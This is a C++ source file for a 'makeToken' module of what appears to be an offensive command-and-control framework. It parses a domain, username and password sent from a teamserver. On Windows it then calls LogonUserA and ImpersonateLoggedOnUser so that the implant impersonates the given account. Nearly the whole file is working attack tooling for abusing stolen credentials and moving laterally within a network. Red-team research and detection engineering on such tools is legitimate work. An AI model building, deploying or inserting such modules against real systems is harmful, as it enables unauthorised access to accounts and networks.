#include "MakeToken.hpp"

#include <cstring>

#include "Tools.hpp"
#include "Common.hpp"

#ifdef __linux__

#elif _WIN32
#include <windows.h>
#endif

#include "Common.hpp"


using namespace std;

#ifdef __linux__

#elif _WIN32

#endif

constexpr std::string_view moduleName = "makeToken";
constexpr unsigned long long moduleHash = djb2(moduleName);

#define ERROR_INVALID_ARGS 1


#ifdef _WIN32

__declspec(dllexport) MakeToken* MakeTokenConstructor() 
{
    return new MakeToken();
}

#else

__attribute__((visibility("default"))) MakeToken* MakeTokenConstructor() 
{
    return new MakeToken();
}

#endif

MakeToken::MakeToken()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
}

MakeToken::~MakeToken()
{
}

std::string MakeToken::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "makeToken:\n";
	info += "Create a token from user and password and impersonate it. \n";
	info += "exemple:\n";
	info += "- makeToken DOMAIN\\Username Password\n";
#endif
	return info;
}

int MakeToken::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
    if(splitedCmd.size()==3)
    {
        // format DOMAIN\Username Password
        string usernameDomain="";
        string password="";
        std::string username="";
        std::string domain=".";
        
        usernameDomain = splitedCmd[1];
        password = splitedCmd[2];
        
        std::vector<std::string> splitedList;
        splitList(usernameDomain, "\\", splitedList);

        if(splitedList.size()==1)
            username = splitedList[0];
        else if(splitedList.size()>1)
        {
            domain = splitedList[0];
            username = splitedList[1];
        }

        std::string cmd = domain;
        cmd += ";";
        cmd += username;
        cmd += ";";
        cmd += password;

        c2Message.set_instruction(splitedCmd[0]);
        c2Message.set_cmd(cmd);
    }
    else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}
#endif

	return 0;
}


int MakeToken::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    const std::string cmd = c2Message.cmd();

    std::vector<std::string> splitedList;
    splitList(cmd, ";", splitedList);

    c2RetMessage.set_instruction(c2RetMessage.instruction());
    c2RetMessage.set_cmd(cmd);

    if(splitedList.size() < 3)
    {
        c2RetMessage.set_errorCode(ERROR_INVALID_ARGS);
        return 0;
    }

    std::string domain=splitedList[0];
    std::string username=splitedList[1];
    std::string password=splitedList[2];

    std::string out = makeToken(username, domain, password);

    c2RetMessage.set_returnvalue(out);
    return 0;
}

//https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonusera
//https://cpp.hotexamples.com/fr/examples/-/-/LogonUserA/cpp-logonusera-function-examples.html
//https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
//https://docs.microsoft.com/en-us/windows/win32/secauthz/client-impersonation
// https://github.com/rapid7/meterpreter/blob/master/source/extensions/kiwi/mimikatz/modules/kuhl_m_token.c
std::string MakeToken::makeToken(const std::string& username, const std::string& domain, const std::string& password)
{
	std::string result;

#ifdef __linux__ 

    result += "MakeToken don't work in linux.\n";

#elif _WIN32

    HANDLE tokenHandle;
    if(LogonUserA(username.c_str(), domain.c_str(), password.c_str(), LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &tokenHandle))
    {
        result += "User logged in successfully.\n";
        if (ImpersonateLoggedOnUser(tokenHandle))
        {
            result += "Impersonate token successfully.\n";
        }
        else
        {
            result += "Fail to impersonate token.\n";
        }

        CloseHandle(tokenHandle);
    }
    else
    {
        result += "Unable to login.\n";
    }

#endif

        return result;
}

int MakeToken::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    int errorCode = c2RetMessage.errorCode();
    if(errorCode > 0)
    {
        if(errorCode == ERROR_INVALID_ARGS)
            errorMsg = "Failed: Invalid arguments";
    }
#endif
    return 0;
}
